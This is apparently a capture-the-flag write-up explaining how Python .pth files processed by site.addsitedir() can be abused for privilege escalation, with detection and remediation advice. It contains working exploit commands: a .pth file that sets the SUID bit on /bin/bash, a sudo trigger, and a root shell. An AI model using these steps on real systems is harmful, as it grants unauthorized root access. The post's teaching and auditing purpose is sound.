Python .pth Files as a Privilege Escalation Vector

2026-06-28  ·  privesc  ·  python  ·  sudo

While solving SmartHIRE on HackTheBox, I discovered a lesser-known Python privilege escalation technique involving .pth files and site.addsitedir(). Here's how it works.

Background: What is site.addsitedir()?

Python's site module manages where Python looks for packages. site.addsitedir(path) adds a directory to sys.path — but it does more than that. It also scans the directory for .pth files and processes each one.

The .pth File Execution Trick

A .pth file normally just lists paths to add to sys.path, one per line. But there's a special rule: any line beginning with import is executed as Python code.

# normal.pth — just adds paths
/home/user/.local/lib/python3.10/site-packages

# evil.pth — this LINE IS EXECUTED
import os; os.system('id')

This is documented behavior, not a bug. It was designed for packages that need to run setup code. But it's a footgun when a privileged script calls site.addsitedir() on a user-writable directory.

The Vulnerable Pattern

import site
from pathlib import Path

PLUGINS_DIR = Path('/opt/tools/plugins')

# if ANY subdirectory here is user-writable, you have code execution as root
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))  # <-- processes .pth files!

Exploitation

Step 1 — Find a writable subdirectory:

ls -la /opt/tools/plugins/
# drwxrwxr-x 2 root devs 4096 ... dev/  <-- writable!

Step 2 — Drop the malicious .pth file:

printf 'import os; os.system("chmod u+s /bin/bash")\n' > /opt/tools/plugins/dev/evil.pth

Step 3 — Trigger the vulnerable script (ideally via sudo):

sudo /usr/bin/python3.10 /opt/tools/vuln_script.py

Step 4 — Root shell:

/bin/bash -p
whoami  # root

Why This Bypasses sys.path Ordering

You might think: "what if the legitimate module directory comes before the writable one in sys.path?" With a .pth file, it doesn't matter. The .pth is executed at addsitedir() call time — before any import statements are resolved. The execution happens unconditionally.

Detection

When auditing sudo rules involving Python scripts, look for:

  • site.addsitedir() called on paths that are user-writable
  • Dynamic plugin loading patterns where the plugin directory isn't root-owned
  • Python scripts with * wildcards in sudo rules (allows arbitrary argument injection)

Remediation

  • Ensure all directories passed to site.addsitedir() in privileged scripts are owned by root and not writable by the running user
  • Prefer explicit imports over dynamic plugin loading in setuid/sudo contexts
  • Audit sudo rules with sudo -l and check every script for dynamic path manipulation
